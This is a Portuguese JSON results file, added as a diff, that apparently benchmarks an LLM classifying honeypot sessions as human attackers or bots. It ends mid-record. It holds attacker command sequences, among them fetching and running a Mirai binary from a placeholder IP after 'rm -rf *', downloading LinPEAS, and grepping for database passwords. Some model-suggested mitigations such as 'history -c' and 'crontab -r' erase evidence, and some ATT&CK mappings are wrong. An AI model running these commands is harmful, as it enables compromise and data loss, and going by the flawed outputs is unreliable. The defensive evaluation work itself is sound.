@@ -1,0 +1,879 @@
+[
+  {
+    "ordem": 1,
+    "session_id": "gen_hum_01_wget_linpeas",
+    "cenario": "Humano baixando ferramenta de enumeracao (linpeas) com wget apos checagem manual",
+    "comandos": [
+      "[1] id (+5s)",
+      "[2] hostname (+4s)",
+      "[3] df -h (+6s)",
+      "[4] cd /dev/shm (+5s)",
+      "[5] wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh (+11s)",
+      "[6] chmod +x linpeas.sh (+6s)",
+      "[7] ./linpeas.sh > relatorio.txt (+7s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou reconhecimento inicial do sistema (id, hostname, df -h), navegou para o diretório temporário /dev/shm, baixou o script de enumeração de privilégios LinPEAS e executou a ferramenta para salvar um relatório.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "hostname, df -h"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1087",
+          "technique_name": "Account Discovery",
+          "evidence": "./linpeas.sh > relatorio.txt"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.51 -j DROP",
+        "rm -f /dev/shm/linpeas.sh /dev/shm/relatorio.txt"
+      ],
+      "session_id": "gen_hum_01_wget_linpeas",
+      "src_ip": "198.51.100.51",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.61,
+      "comandos": [
+        "id",
+        "hostname",
+        "df -h",
+        "cd /dev/shm",
+        "wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+        "chmod +x linpeas.sh",
+        "./linpeas.sh > relatorio.txt"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor obteve acesso root, realizou reconhecimento básico do sistema (id, hostname, df) e baixou um script conhecido de enumeração de privilégios (LinPEAS) para identificar vetores de escalonamento ou persistência, caracterizando uma exploração manual interativa.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "id"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "hostname, df -h"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1135",
+          "technique_name": "Network Share Discovery",
+          "evidence": "linpeas.sh executado para varredura completa de privilégios"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "pkill -u root -f linpeas.sh",
+        "rm -rf /dev/shm/linpeas.sh /dev/shm/relatorio.txt",
+        "history -c",
+        "iptables -A INPUT -s 198.51.100.51 -j DROP"
+      ],
+      "session_id": "gen_hum_01_wget_linpeas",
+      "src_ip": "198.51.100.51",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.58,
+      "comandos": [
+        "id",
+        "hostname",
+        "df -h",
+        "cd /dev/shm",
+        "wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+        "chmod +x linpeas.sh",
+        "./linpeas.sh > relatorio.txt"
+      ]
+    }
+  },
+  {
+    "ordem": 2,
+    "session_id": "gen_hum_02_docker_sudo",
+    "cenario": "Humano inspecionando containers Docker, processos e escalando com sudo su",
+    "comandos": [
+      "[1] w (+4s)",
+      "[2] ps aux (+7s)",
+      "[3] docker ps (+8s)",
+      "[4] sudo su - (+6s)",
+      "[5] journalctl -n 20 (+10s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou reconhecimento ativo do sistema verificando usuários conectados, processos em execução, containers Docker ativos, elevou privilégios para root e examinou logs recentes do sistema via journalctl.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "w"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1057",
+          "technique_name": "Process Discovery",
+          "evidence": "ps aux"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1613",
+          "technique_name": "Container and Resource Discovery",
+          "evidence": "docker ps"
+        },
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.003",
+          "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+          "evidence": "sudo su -"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1005",
+          "technique_name": "Data from Local System",
+          "evidence": "journalctl -n 20"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.52 -j DROP",
+        "passwd -l root",
+        "auditctl -w /var/log/journal -p wa -k journal_access"
+      ],
+      "session_id": "gen_hum_02_docker_sudo",
+      "src_ip": "198.51.100.52",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.69,
+      "comandos": [
+        "w",
+        "ps aux",
+        "docker ps",
+        "sudo su -",
+        "journalctl -n 20"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "Sessão interativa demonstrando reconhecimento inicial do sistema (verificação de usuários logados, processos e containers Docker) seguida por escalação de privilégios para root através de sudo e inspeção de logs do sistema.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1033",
+          "technique_name": "System Owner/User Discovery",
+          "evidence": "w"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1057",
+          "technique_name": "Process Discovery",
+          "evidence": "ps aux"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1613",
+          "technique_name": "Container and Resource Discovery",
+          "evidence": "docker ps"
+        },
+        {
+          "tactic": "Privilege Escalation",
+          "technique_id": "T1548.003",
+          "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+          "evidence": "sudo su -"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1005",
+          "technique_name": "Data from Local System",
+          "evidence": "journalctl -n 20"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l ubuntu",
+        "pkill -u ubuntu",
+        "iptables -A INPUT -s 198.51.100.52 -j DROP",
+        "auditctl -w /etc/sudoers -p wa -k sudoers_changes"
+      ],
+      "session_id": "gen_hum_02_docker_sudo",
+      "src_ip": "198.51.100.52",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.7,
+      "comandos": [
+        "w",
+        "ps aux",
+        "docker ps",
+        "sudo su -",
+        "journalctl -n 20"
+      ]
+    }
+  },
+  {
+    "ordem": 3,
+    "session_id": "gen_hum_03_curl_rede",
+    "cenario": "Humano testando conectividade externa com curl ifconfig.me e tabelas ARP/DNS",
+    "comandos": [
+      "[1] curl ifconfig.me (+6s)",
+      "[2] arp -a (+5s)",
+      "[3] cat /etc/resolv.conf (+7s)",
+      "[4] cat /etc/hosts (+6s)",
+      "[5] ping -c 2 8.8.8.8 (+7s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O invasor realizou reconhecimento manual da rede e das configurações de conectividade do sistema comprometido usando comandos interativos.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1016",
+          "technique_name": "System Network Configuration Discovery",
+          "evidence": "Uso de curl para verificar IP externo (ifconfig.me) e leitura de /etc/resolv.conf e /etc/hosts."
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1046",
+          "technique_name": "Network Service Discovery",
+          "evidence": "Uso do comando arp -a para mapear dispositivos na rede local."
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.53 -j DROP",
+        "passwd -l root"
+      ],
+      "session_id": "gen_hum_03_curl_rede",
+      "src_ip": "198.51.100.53",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.26,
+      "comandos": [
+        "curl ifconfig.me",
+        "arp -a",
+        "cat /etc/resolv.conf",
+        "cat /etc/hosts",
+        "ping -c 2 8.8.8.8"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "MÉDIO",
+      "summary": "O operador humano realizou comandos pausados (intervalos de 5 a 7 segundos) para reconhecimento pós-exploração, incluindo verificação de IP externo, inspeção de tabelas ARP, análise de configuração de rede (resolv.conf e hosts) e teste de conectividade com a internet.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1016",
+          "technique_name": "System Network Configuration Discovery",
+          "evidence": "cat /etc/resolv.conf, cat /etc/hosts, curl ifconfig.me"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1049",
+          "technique_name": "System Network Connections Discovery",
+          "evidence": "arp -a, ping -c 2 8.8.8.8"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "iptables -A INPUT -p icmp --icmp-type echo-request -j DROP",
+        "history -c && exit"
+      ],
+      "session_id": "gen_hum_03_curl_rede",
+      "src_ip": "198.51.100.53",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.53,
+      "comandos": [
+        "curl ifconfig.me",
+        "arp -a",
+        "cat /etc/resolv.conf",
+        "cat /etc/hosts",
+        "ping -c 2 8.8.8.8"
+      ]
+    }
+  },
+  {
+    "ordem": 4,
+    "session_id": "gen_hum_04_db_systemd",
+    "cenario": "Humano enumerando servicos systemd e bancos de dados MySQL",
+    "comandos": [
+      "[1] systemctl list-units --type=service (+12s)",
+      "[2] mysql -u root -e 'SHOW DATABASES;' (+18s)",
+      "[3] grep -rn 'DB_PASSWORD' /opt/ 2>/dev/null (+18s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor realizou enumeração manual de serviços do sistema, listou bancos de dados MySQL e buscou por credenciais de banco de dados no diretório /opt/, indicando reconhecimento ativo pós-comprometimento.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1007",
+          "technique_name": "System Service Discovery",
+          "evidence": "systemctl list-units --type=service"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1046",
+          "technique_name": "Network Service Discovery",
+          "evidence": "mysql -u root -e 'SHOW DATABASES;'"
+        },
+        {
+          "tactic": "Credential Access",
+          "technique_id": "T1552.001",
+          "technique_name": "Unsecured Credentials: Files",
+          "evidence": "grep -rn 'DB_PASSWORD' /opt/ 2>/dev/null"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.54 -j DROP",
+        "passwd -l root",
+        "history -c"
+      ],
+      "session_id": "gen_hum_04_db_systemd",
+      "src_ip": "198.51.100.54",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.34,
+      "comandos": [
+        "systemctl list-units --type=service",
+        "mysql -u root -e 'SHOW DATABASES;'",
+        "grep -rn 'DB_PASSWORD' /opt/ 2>/dev/null"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O operador realizou varredura manual de serviços do systemd, enumerou bancos de dados MySQL e buscou credenciais hardcoded em diretórios de aplicação, indicando reconhecimento ativo e direcionado a sistemas de banco de dados.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1007",
+          "technique_name": "System Service Discovery",
+          "evidence": "systemctl list-units --type=service"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery",
+          "evidence": "grep -rn 'DB_PASSWORD' /opt/ 2>/dev/null"
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "history -c",
+        "iptables -A INPUT -s 198.51.100.54 -j DROP",
+        "auditctl -w /opt/ -p wa -k sensitive_files"
+      ],
+      "session_id": "gen_hum_04_db_systemd",
+      "src_ip": "198.51.100.54",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.37,
+      "comandos": [
+        "systemctl list-units --type=service",
+        "mysql -u root -e 'SHOW DATABASES;'",
+        "grep -rn 'DB_PASSWORD' /opt/ 2>/dev/null"
+      ]
+    }
+  },
+  {
+    "ordem": 5,
+    "session_id": "gen_hum_05_gcc_exploit",
+    "cenario": "Humano editando e compilando exploit local em C",
+    "comandos": [
+      "[1] gcc --version (+5s)",
+      "[2] python3 --version (+6s)",
+      "[3] vi exploit.c (+25s)",
+      "[4] gcc exploit.c -o exp (+9s)",
+      "[5] ./exp (+7s)"
+    ],
+    "ground_truth": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "ATAQUE_HUMANO_DIRECIONADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor verificou ferramentas de compilação disponíveis, criou um arquivo de exploit utilizando o editor vi, compilou o código-fonte e executou o binário resultante no sistema alvo.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1203",
+          "technique_name": "Exploitation for Client Execution",
+          "evidence": "vi exploit.c, gcc exploit.c -o exp, ./exp"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1027",
+          "technique_name": "Obfuscated Files or Information",
+          "evidence": "Compilação de código customizado (exploit.c) para binário (exp)"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.55 -j DROP",
+        "rm -f exploit.c exp",
+        "pkill -u user"
+      ],
+      "session_id": "gen_hum_05_gcc_exploit",
+      "src_ip": "198.51.100.55",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.53,
+      "comandos": [
+        "gcc --version",
+        "python3 --version",
+        "vi exploit.c",
+        "gcc exploit.c -o exp",
+        "./exp"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "CRÍTICO",
+      "summary": "O invasor verificou a disponibilidade de compiladores e interpretadores (gcc, python3), criou manualmente um arquivo de exploit utilizando o editor vi, compilou o código-fonte e executou o binário resultante na máquina comprometida, indicando forte presença de interação humana.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "Execução direta de comandos e binários compilados."
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1106",
+          "technique_name": "Native API",
+          "evidence": "Compilação e execução de código nativo (exploit.c)."
+        }
+      ],
+      "mitigation_commands": [
+        "killall -9 exp",
+        "rm -f exploit.c exp",
+        "passwd -l user",
+        "auditctl -w /usr/bin/gcc -p x -k gcc_exec"
+      ],
+      "session_id": "gen_hum_05_gcc_exploit",
+      "src_ip": "198.51.100.55",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.44,
+      "comandos": [
+        "gcc --version",
+        "python3 --version",
+        "vi exploit.c",
+        "gcc exploit.c -o exp",
+        "./exp"
+      ]
+    }
+  },
+  {
+    "ordem": 6,
+    "session_id": "gen_bot_01_ls_cd_burst",
+    "cenario": "Bot usando cd e ls em rajada de 0s antes de baixar binario Mirai",
+    "comandos": [
+      "[1] cd /tmp (+0s)",
+      "[2] ls -la (+0s)",
+      "[3] rm -rf * (+0s)",
+      "[4] wget -q http://198.51.100.61/mirai.x86 (+0s)",
+      "[5] chmod 777 mirai.x86 (+0s)",
+      "[6] ./mirai.x86 (+0s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "Download e execução automatizada de malware (Mirai botnet) diretamente em diretório temporário, sem erros de digitação e com intervalos de tempo zerados.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "chmod 777 mirai.x86 e ./mirai.x86 executados imediatamente após o download."
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://198.51.100.61/mirai.x86"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.61 -j DROP",
+        "pkill -f mirai.x86",
+        "rm -f /tmp/mirai.x86"
+      ],
+      "session_id": "gen_bot_01_ls_cd_burst",
+      "src_ip": "198.51.100.61",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.31,
+      "comandos": [
+        "cd /tmp",
+        "ls -la",
+        "rm -rf *",
+        "wget -q http://198.51.100.61/mirai.x86",
+        "chmod 777 mirai.x86",
+        "./mirai.x86"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "CRÍTICO",
+      "summary": "Sessão típica de infecção por malware IoT (Mirai). O atacante limpa o diretório temporário, baixa o binário compilado para a arquitetura x86 via wget, altera as permissões para execução e executa o payload imediatamente sem hesitação ou digitação manual.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204",
+          "technique_name": "User Execution",
+          "evidence": "./mirai.x86"
+        },
+        {
+          "tactic": "Ingress Tool Transfer",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer",
+          "evidence": "wget -q http://198.51.100.61/mirai.x86"
+        }
+      ],
+      "mitigation_commands": [
+        "killall -9 mirai.x86",
+        "rm -f /tmp/mirai.x86",
+        "passwd -l root",
+        "iptables -A INPUT -s 198.51.100.61 -j DROP"
+      ],
+      "session_id": "gen_bot_01_ls_cd_burst",
+      "src_ip": "198.51.100.61",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.38,
+      "comandos": [
+        "cd /tmp",
+        "ls -la",
+        "rm -rf *",
+        "wget -q http://198.51.100.61/mirai.x86",
+        "chmod 777 mirai.x86",
+        "./mirai.x86"
+      ]
+    }
+  },
+  {
+    "ordem": 7,
+    "session_id": "gen_bot_02_proc_mounts",
+    "cenario": "Bot verificando memoria livre e pontos de montagem em <1s",
+    "comandos": [
+      "[1] free -m (+0s)",
+      "[2] cat /proc/mounts (+0s)",
+      "[3] ulimit -n (+0s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Execução automatizada de comandos para coleta de informações de recursos do sistema e pontos de montagem logo após o acesso inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "free -m e cat /proc/mounts"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.62 -j DROP"
+      ],
+      "session_id": "gen_bot_02_proc_mounts",
+      "src_ip": "198.51.100.62",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.04,
+      "comandos": [
+        "free -m",
+        "cat /proc/mounts",
+        "ulimit -n"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "O invasor executou comandos rápidos de reconhecimento de recursos do sistema (memória livre, pontos de montagem e limites de arquivos abertos) logo após a autenticação, comportamento típico de scripts de enumeração automatizada.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "Execução de 'free -m' e 'cat /proc/mounts' para coletar informações sobre o sistema e recursos."
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1057",
+          "technique_name": "Process Discovery",
+          "evidence": "Verificação de limites de descritores de arquivos com 'ulimit -n'."
+        }
+      ],
+      "mitigation_commands": [
+        "passwd -l root",
+        "sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config",
+        "systemctl restart sshd",
+        "iptables -A INPUT -s 198.51.100.62 -j DROP"
+      ],
+      "session_id": "gen_bot_02_proc_mounts",
+      "src_ip": "198.51.100.62",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.39,
+      "comandos": [
+        "free -m",
+        "cat /proc/mounts",
+        "ulimit -n"
+      ]
+    }
+  },
+  {
+    "ordem": 8,
+    "session_id": "gen_bot_03_killer_miner",
+    "cenario": "Script automatizado de botnet matando mineradores concorrentes",
+    "comandos": [
+      "[1] pkill -9 xmrig (+0s)",
+      "[2] killall -9 kdevtmpfsi (+0s)",
+      "[3] crontab -r (+0s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "ATAQUE_HUMANO_DIRECIONADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor removeu processos de criptomineradores concorrentes (xmrig, kdevtmpfsi) e limpou as tarefas agendadas (crontab), indicando preparação do sistema para implantação de seu próprio payload.",
+      "mitre_attack": [
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1489",
+          "technique_name": "Service Stop",
+          "evidence": "pkill -9 xmrig, killall -9 kdevtmpfsi"
+        },
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1070.008",
+          "technique_name": "Indicator Removal on Host: Indicator Removal from Tools",
+          "evidence": "crontab -r"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.63 -j DROP",
+        "killall -9 xmrig kdevtmpfsi",
+        "crontab -r"
+      ],
+      "session_id": "gen_bot_03_killer_miner",
+      "src_ip": "198.51.100.63",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.49,
+      "comandos": [
+        "pkill -9 xmrig",
+        "killall -9 kdevtmpfsi",
+        "crontab -r"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor executou comandos instantâneos para encerrar processos de mineração concorrentes (xmrig, kdevtmpfsi) e limpou as tarefas agendadas do cron (crontab -r), comportamento típico de um worm ou script de botnet assegurando exclusividade sobre o recurso comprometido.",
+      "mitre_attack": [
+        {
+          "tactic": "Defense Evasion",
+          "technique_id": "T1562.001",
+          "technique_name": "Impair Defenses: Disable or Modify Tools",
+          "evidence": "pkill -9 xmrig, killall -9 kdevtmpfsi"
+        },
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "Execução direta de comandos via shell interativo ou script automatizado."
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.63 -j DROP",
+        "passwd -l root",
+        "ps aux | grep -iE 'xmrig|kdevtmpfsi'",
+        "crontab -l"
+      ],
+      "session_id": "gen_bot_03_killer_miner",
+      "src_ip": "198.51.100.63",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.44,
+      "comandos": [
+        "pkill -9 xmrig",
+        "killall -9 kdevtmpfsi",
+        "crontab -r"
+      ]
+    }
+  },
+  {
+    "ordem": 9,
+    "session_id": "gen_bot_04_busybox_iot",
+    "cenario": "Sonda automatizada estilo Mirai/IoT testando busybox",
+    "comandos": [
+      "[1] enable (+0s)",
+      "[2] system (+0s)",
+      "[3] shell (+0s)",
+      "[4] sh (+0s)",
+      "[5] /bin/busybox ECCHI (+0s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "Execução imediata de payloads específicos para IoT usando BusyBox após a autenticação, indicando infecção automatizada por malware.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "/bin/busybox ECCHI"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.64 -j DROP",
+        "passwd -l admin"
+      ],
+      "session_id": "gen_bot_04_busybox_iot",
+      "src_ip": "198.51.100.64",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.11,
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox ECCHI"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "ALTO",
+      "summary": "O invasor utilizou comandos sequenciais imediatos sem pausas de digitação para acessar o shell do sistema e executar um binário BusyBox (ECCHI), típico de malware de IoT e botnets.",
+      "mitre_attack": [
+        {
+          "tactic": "Execution",
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "evidence": "Uso de sh e acesso a shell via system."
+        },
+        {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File",
+          "evidence": "Execução direta do binário /bin/busybox ECCHI."
+        }
+      ],
+      "mitigation_commands": [
+        "passwd",
+        "iptables -A INPUT -s 198.51.100.64 -j DROP",
+        "systemctl disable telnet",
+        "systemctl disable ssh"
+      ],
+      "session_id": "gen_bot_04_busybox_iot",
+      "src_ip": "198.51.100.64",
+      "etapa": "API_gemini-3.5-flash-lite_PROMPT_NEUTRO",
+      "tempo_segundos": 1.49,
+      "comandos": [
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "/bin/busybox ECCHI"
+      ]
+    }
+  },
+  {
+    "ordem": 10,
+    "session_id": "gen_bot_05_ssh_spread",
+    "cenario": "Sonda automatizada checando tabela ARP e CPU em 0s",
+    "comandos": [
+      "[1] cat /proc/net/arp (+0s)",
+      "[2] lscpu (+0s)"
+    ],
+    "ground_truth": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_com_regras": "BOT_AUTOMATIZADO",
+    "classificacao_prompt_neutro": "BOT_AUTOMATIZADO",
+    "resposta_crua_prompt_regras": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "MÉDIO",
+      "summary": "Coleta automatizada de informações do sistema e rede via comandos para reconhecimento rápido após acesso inicial.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "lscpu"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1016",
+          "technique_name": "System Network Configuration Discovery",
+          "evidence": "cat /proc/net/arp"
+        }
+      ],
+      "mitigation_commands": [
+        "iptables -A INPUT -s 198.51.100.65 -j DROP"
+      ],
+      "session_id": "gen_bot_05_ssh_spread",
+      "src_ip": "198.51.100.65",
+      "etapa": "API_gemini-3.5-flash-lite",
+      "tempo_segundos": 1.28,
+      "comandos": [
+        "cat /proc/net/arp",
+        "lscpu"
+      ]
+    },
+    "resposta_crua_prompt_neutro": {
+      "actor_type": "BOT_AUTOMATIZADO",
+      "severity_level": "BAIXO",
+      "summary": "Execução rápida e automatizada de comandos de reconhecimento básico para coleta de informações de rede e arquitetura de CPU, típica de scripts de sondagem inicial ou worms.",
+      "mitre_attack": [
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1082",
+          "technique_name": "System Information Discovery",
+          "evidence": "lscpu"
+        },
+        {
+          "tactic": "Discovery",
+          "technique_id": "T1016",
+          "technique_name": "System Network Configuration Discovery",
+          "evidence": "cat /proc/net/arp"
